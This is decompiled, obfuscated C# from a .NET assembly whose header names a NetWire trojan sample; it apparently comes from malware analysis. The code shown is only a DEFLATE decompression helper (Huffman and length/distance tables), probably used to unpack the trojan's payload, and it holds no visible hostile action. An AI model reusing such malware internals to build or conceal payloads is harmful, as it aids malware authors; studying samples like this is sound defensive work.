// Decompiled with JetBrains decompiler
// Type: #ac.#9b
// Assembly: u1rug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=dbb94034cbd6bbd6
// MVID: C8A082E9-30A2-423A-BCDF-59565BB76FBE
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.NetWire.gen-baba76d578be903c9d78e3d6417636ba6a8069cafe9ccccdfce2bc19b43fc299.exe

using \u0023ac;
using \u0023e;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0023ac
{
  internal static class \u00239b
  {
    internal sealed class \u0023qc
    {
      internal static readonly int[] \u0023bc = new int[29]
      {
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        13,
        15,
        17,
        19,
        23,
        27,
        31,
        35,
        43,
        51,
        59,
        67,
        83,
        99,
        115,
        131,
        163,
        195,
        227,
        258
      };
      internal static readonly int[] \u0023cc = new int[29]
      {
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        1,
        1,
        1,
        2,
        2,
        2,
        2,
        3,
        3,
        3,
        3,
        4,
        4,
        4,
        4,
        5,
        5,
        5,
        5,
        0
      };
      internal static readonly int[] \u0023dc = new int[30]
      {
        1,
        2,
        3,
        4,
        5,
        7,
        9,
        13,
        17,
        25,
        33,
        49,
        65,
        97,
        129,
        193,
        257,
        385,
        513,
        769,
        1025,
        1537,
        2049,
        3073,
        4097,
        6145,
        8193,
        12289,
        16385,
        24577
      };
      internal static readonly int[] \u0023ec = new int[30]
      {
        0,
        0,
        0,
        0,
        1,
        1,
        2,
        2,
        3,
        3,
        4,
        4,
        5,
        5,
        6,
        6,
        7,
        7,
        8,
        8,
        9,
        9,
        10,
        10,
        11,
        11,
        12,
        12,
        13,
        13
      };
      internal int \u0023fc;
      internal int \u0023gc;
      internal int \u0023hc;
      internal int \u0023ic;
      internal int \u0023jc;
      internal bool \u0023kc;
      internal \u00239b.\u0023wc \u0023lc;
      internal \u00239b.\u0023mc \u0023mc;
      internal \u00239b.\u0023Qc \u0023nc;
      internal \u00239b.\u0023Cc \u0023oc;
      internal \u00239b.\u0023Cc \u0023pc;

      public \u0023qc([In] byte[] obj0)
      {
        this.\u0023lc = new \u00239b.\u0023wc();
        this.\u0023mc = new \u00239b.\u0023mc();
        this.\u0023fc = 2;
        \u0023\u0023.\u0023Fd(obj0, obj0.Length, this.\u0023lc, 0);
      }
    }

    internal sealed class \u0023wc
    {
      internal byte[] \u0023rc;
      internal int \u0023sc;
      internal int \u0023tc;
      internal uint \u0023uc;
      internal int \u0023vc;
    }

    internal sealed class \u0023mc
    {
      internal byte[] \u0023rc = new byte[32768];
      internal int \u0023xc;
      internal int \u0023yc;
    }

    internal sealed class \u0023Cc
    {
      internal short[] \u0023zc;
      public static readonly \u00239b.\u0023Cc \u0023Ac;
      public static readonly \u00239b.\u0023Cc \u0023Bc;

      static \u0023Cc()
      {
        byte[] numArray1 = new byte[288];
        int num1 = 0;
        while (num1 < 144)
          numArray1[num1++] = (byte) 8;
        while (num1 < 256)
          numArray1[num1++] = (byte) 9;
        while (num1 < 280)
          numArray1[num1++] = (byte) 7;
        while (num1 < 288)
          numArray1[num1++] = (byte) 8;
        \u00239b.\u0023Cc.\u0023Ac = new \u00239b.\u0023Cc(numArray1);
        byte[] numArray2 = new byte[32];
        int num2 = 0;
        while (num2 < 32)
          numArray2[num2++] = (byte) 5;
        \u00239b.\u0023Cc.\u0023Bc = new \u00239b.\u0023Cc(numArray2);
      }

      public \u0023Cc([In] byte[] obj0) => \u0023\u0023.\u0023yd(obj0, this);
    }

    internal sealed class \u0023Qc
    {
      internal static readonly int[] \u0023Dc = new int[3]
      {
        3,
        3,
        11
      };
      internal static readonly int[] \u0023Ec = new int[3]
      {
        2,
        3,
        7
      };
      internal byte[] \u0023Fc;
      internal byte[] \u0023Gc;
      internal \u00239b.\u0023Cc \u0023Hc;
      internal int \u0023fc;
      internal int \u0023Ic;
      internal int \u0023Jc;
      internal int \u0023Kc;
      internal int \u0023Lc;
      internal int \u0023Mc;
      internal byte \u0023Nc;
      internal int \u0023Oc;
      internal static readonly int[] \u0023Pc;

      static \u0023Qc()
      {
        int[] numArray = new int[19];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle = __fieldref (\u0023bd.\u00238c);
        if (true)
          goto label_2;
label_1:
        \u00239b.\u0023Qc.\u0023Pc = numArray;
        return;
label_2:
        RuntimeHelpers.InitializeArray((Array) numArray, fldHandle);
        goto label_1;
      }
    }

    internal sealed class \u0023Wc
    {
      private static readonly int[] \u0023Pc = new int[19]
      {
        16,
        17,
        18,
        0,
        8,
        7,
        9,
        6,
        10,
        5,
        11,
        4,
        12,
        3,
        13,
        2,
        14,
        1,
        15
      };
      internal static readonly byte[] \u0023Rc = new byte[16]
      {
        (byte) 0,
        (byte) 8,
        (byte) 4,
        (byte) 12,
        (byte) 2,
        (byte) 10,
        (byte) 6,
        (byte) 14,
        (byte) 1,
        (byte) 9,
        (byte) 5,
        (byte) 13,
        (byte) 3,
        (byte) 11,
        (byte) 7,
        (byte) 15
      };
      private static readonly short[] \u0023Sc = new short[286];
      private static readonly byte[] \u0023Tc = new byte[286];
      private static readonly short[] \u0023Uc;
      private static readonly byte[] \u0023Vc;

      static \u0023Wc()
      {
        if (true)
          goto label_13;
label_2:
        int index1;
        for (; index1 < 144; \u00239b.\u0023Wc.\u0023Tc[index1++] = (byte) 8)
          \u00239b.\u0023Wc.\u0023Sc[index1] = \u0023\u0023.\u0023xd(48 + index1 << 8);
        for (; index1 < 256; \u00239b.\u0023Wc.\u0023Tc[index1++] = (byte) 9)
          \u00239b.\u0023Wc.\u0023Sc[index1] = \u0023\u0023.\u0023xd(256 + index1 << 7);
        for (; index1 < 280; \u00239b.\u0023Wc.\u0023Tc[index1++] = (byte) 7)
          \u00239b.\u0023Wc.\u0023Sc[index1] = \u0023\u0023.\u0023xd(index1 - 256 << 9);
        for (; index1 < 286; \u00239b.\u0023Wc.\u0023Tc[index1++] = (byte) 8)
          \u00239b.\u0023Wc.\u0023Sc[index1] = \u0023\u0023.\u0023xd(index1 - 88 << 8);
        \u00239b.\u0023Wc.\u0023Uc = new short[30];
        \u00239b.\u0023Wc.\u0023Vc = new byte[30];
        for (int index2 = 0; index2 < 30; ++index2)
        {
          \u00239b.\u0023Wc.\u0023Uc[index2] = \u0023\u0023.\u0023xd(index2 << 11);
          \u00239b.\u0023Wc.\u0023Vc[index2] = (byte) 5;
        }
        return;
label_13:
        index1 = 0;
        goto label_2;
      }
    }

    internal sealed class \u0023Xc : MemoryStream
    {
      public \u0023Xc([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
